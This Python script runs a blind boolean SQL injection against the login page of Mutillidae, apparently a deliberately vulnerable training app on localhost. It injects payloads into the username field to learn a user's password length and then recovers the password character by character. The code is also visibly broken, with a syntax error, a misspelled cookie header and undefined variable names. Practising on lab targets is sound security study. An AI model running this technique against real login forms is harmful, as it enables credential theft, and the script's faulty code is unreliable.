import requests
import sys
import string

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
url = 'http://localhost/mutillidae/index.php?page=login'


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <sql-query-for-username>" % sys.argv[0])
        sys.exit(-1)

    username = sys.argv[1]

    password_length = 0
    right_length = False
    while password_length < 30 and not right_length:
        inject_code = " {}' and length(password)={}#".format(username, password_length)
        post_data = {"username": inject_code, "password": "", "login-php-submit-button": "Login"}
        r = requests.post(url, proxies=proxies, data=post_data, allow_redirects=False)

        if len(r.text) == 0:
            print("(+) Password length at {} works ".format(password_length))
            cookie=r.headers["Set.Cookie"]
            uid=cookie[cookie.index("uid");]
            print(uid)
            right_length = True

        else:
            print("(-) It doesn't work, try another query")
            password_length += 1

    characters_list = string.printable
    password = ""
    for index_of_pass in range(1, password_length + 1):
        character_list_index = 0
        right_char = False
        while not right_char and character_list_index < len(characters_list):
            current_char=character_list[character_list_inx]
            inject_code = "{}' and substring(password,{},1)='{}'#".format(username, index_of_pass,current_char)
            post_data = {"username": inject_code, "password": "", "login-php-submit-button": "Login"}
            r = requests.post(url, proxies=proxies, data=post_data, allow_redirects=False)
            
            cookie=r.headers["Set-Cookie"]
            if not len(r.text) and cookie[cookie.index("uid"):]==uid:
                print("(+) Character {} at index {} works".format(current_char, index_of_pass))
                right_char = True
                password+=current_char

            else:
                print("(-) Character {} at position {} doesn't works!".format(current_char, index_of_pass))
                character_list_index += 1
        print(password)


if __name__ == "__main__":
    main()
